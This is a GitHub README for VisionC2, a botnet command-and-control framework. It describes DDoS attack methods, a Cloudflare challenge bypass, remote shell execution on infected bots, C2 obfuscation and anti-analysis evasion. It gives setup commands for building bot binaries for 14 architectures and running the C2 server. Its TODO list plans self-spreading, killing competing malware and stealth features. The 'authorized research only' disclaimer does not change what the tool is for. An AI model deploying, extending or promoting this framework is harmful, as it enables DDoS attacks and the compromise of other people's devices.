
# VisionC2 – Advanced Botnet Command & Control Framework

## 📑 Table of Contents

- [📋 Changelog](https://github.com/Syn2Much/VisionC2/blob/main/CHANGELOG.md)
- [🚀 Installation & Setup](#-installation--setup)
- [🎯 Quick Usage](#-quick-usage)
- [🛠️ Command Reference](https://github.com/Syn2Much/VisionC2/blob/main/cnc/COMMANDS.md)
- [🏗️ Architecture Overview](#️-architecture-overview)
- [📋 WIP/TODO](#-wiptodo)
- [⚖️ Disclaimer](#️-disclaimer)
- [🤝 Community & Support](#-community--support)

![VisionC2 Banner](https://img.shields.io/badge/VisionNet-V1.5-red)
![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

---

#### 🎯 Bot Capabilities

- **Layer 4**

  - UDP, TCP, SYN, ACK, GRE, and DNS-based Attack Methods

- **Layer 7**

  - HTTP / HTTPS / TLS traffic with HTTP/2 fingerprinting
  - Cloudflare UAM bypass with captcha solving

- **RCE**

  - Send shell commands to bot(s) with real-time output streaming or fire-and-forget mode

- **SOCKS5**

  - Turn any agent into a SOCKS5 proxy server on a specified port

---

#### 🔒 Security Features

- **TLS 1.3** with perfect forward secrecy for all communications

  > Zero plain-text communications

- **No hardcoded C2**

  > C2 address protected via RC4, XOR, byte substitution, and MD5

- **HMAC Authentication**

  > Challenge–response verification for agent integrity

- **Anti-Analysis Protections**

  > Multi-stage sandbox and analysis environment detection

---

**Vision is built to be set up via a setup script, meaning there are no code changes required.**

*Performance: 2 servers = 40k RPS / 2–6 Gbps*

![Animation](https://github.com/user-attachments/assets/35b58bb7-04ac-4318-9bd3-ceaed2a0235b)

---

## 🚀 Installation & Setup

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
# Go 1.23+ required - download from https://go.dev/dl/
```

### ⭐ Use the Setup Wizard (Required for Encrypting C2 URL/IP)

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

> 💡 **Setup Wizard handles Encryption, Certs, and Code Updates. The entire setup for Vision takes no more then 5 minutes.**

```text
Setup Wizard Flow (Summary)

[1] Full Setup        → New C2, magic code, certs (fresh install)
[2] C2 URL Update    → Change C2 address only
[0] Exit

Step 1/5: C2 Configuration
- C2 address: c2.domain.com:443 (TLS, fixed)
- Admin port: 200

Step 2/5: Security Tokens
- Magic code, protocol version, crypt seed auto-generated
- Multi-layer obfuscation applied

Step 3/5: TLS Certificates
- 4096-bit RSA key
- Self-signed TLS certificate generated

Step 4/5: Source Updates
- CNC and bot configuration updated

Step 5/5: Build
- CNC server built
- Bot binaries built (14 architectures)
```

**That's it!** The wizard handles everything:

- C2 address configuration & obfuscation
- Random magic codes & protocol versions
- TLS certificate generation
- Source code updates
- Building CNC + 14 bot architectures

---

## 🎯 Quick Usage

### Starting the C2 Server

```bash
cd cnc
screen ./cnc
```

> 💡 Use `screen` to keep the C2 running after disconnecting. Reattach with `screen -r`.

### Connecting to Admin Console

```bash
# In another terminal
nc YOUR_SERVER_IP YOUR_ADMIN_PORT
```

Once connected:

1. Type `spamtec` to trigger the login prompt
2. Enter your credentials (default: `admin:changeme`)
3. Type `help` to see available commands

### Rebuilding Bots (After Initial Setup)

```bash
cd bot
./build.sh
```
> Use this to rebuild bot binaries without changing C2 configuration.
### Updating C2 Address (After Initial Setup)

```bash
python setup.py
select option 2
Makes Code Updates & Rebuilds
```
> Use this to update/move C2s without losing old bots (keeps certs, crypt seed, magic key & version)



The CNC server will start listening on:

- **Port 443 (TLS)**: For bot connections (fixed, cannot be changed)
- **Admin Port (configurable)**: For admin console connections (default: 420)



### Bot Deployment

Bot binaries are located in `bot/bins/` after building. The directory contains executables for 14+ architectures.

---

## 🏗️ Architecture Overview

VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:

```
┌─────────────────┐    TLS 1.3    ┌─────────────────┐
│   Admin Console │◄──────────────►│    C2 Server    │
│  (Multi-User)   │                │  (Go Backend)   │
└─────────────────┘                └─────────────────┘
                                         │ TLS 1.3
                                         ▼
┌─────────────────┐                ┌─────────────────┐
│   Bot Agents    │◄───────────────┤  Bot Registry   │
│ (14+ Architectures)│             │ & Management    │
└─────────────────┘                └─────────────────┘
```

### C2 Resolution System

```
┌──────────────────────────────────────────────────────────────┐
│ 📡 C2 Resolution - How Bots Find Your Server                 │
├──────────────────────────────────────────────────────────────┤
│ The bot uses a multi-method resolution system:               │
│                                                              │
│ Resolution Order (automatic fallback):                       │
│   1. DNS TXT Record  → Checks for TXT record on domain       │
│   2. DoH TXT Lookup  → Cloudflare/Google DNS-over-HTTPS      │
│   3. A Record        → Falls back to standard DNS A record   │
│   4. Direct IP       → Uses the value as-is if IP:port       │
│                                                              │
│ You can enter:                                               │
│   • Direct IP      → 192.168.1.100 (simplest)                │
│   • Domain name    → c2.example.com (uses A record)          │
│   • TXT domain     → lookup.example.com (advanced)           │
└──────────────────────────────────────────────────────────────┘
```

---

## 📋 WIP/TODO

- Auto Generated DGA Fallback Domains for bot
- Locker/Killer to stay on the device and eliminate competing malware
- Spread/Self-Rep Mechanism for
- Enhanced Daemonize with better stealth
- Single Instance/Port Takeover Networking capabilities

---

## ⚖️ Disclaimer

**WARNING: FOR AUTHORIZED SECURITY RESEARCH ONLY**

**LEGAL REQUIREMENTS:**

1. Obtain written permission from system owners before testing
2. Use only on systems you own or have explicit authorization to test
3. Comply with all applicable laws and regulations
4. Do not use for malicious purposes

The developers assume no liability and are not responsible for any misuse or damage caused by this program. By using this software, you agree to use it responsibly and legally.

---

## 🤝 Community & Support

### Acknowledgments

- Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo

### Support

- **GitHub Issues**: For bug reports and feature requests
- **Email**: [dev@sinners.city](mailto:dev@sinners.city) for security-related concerns

### License

This project is licensed under the GNU License - see the LICENSE file for details.

---
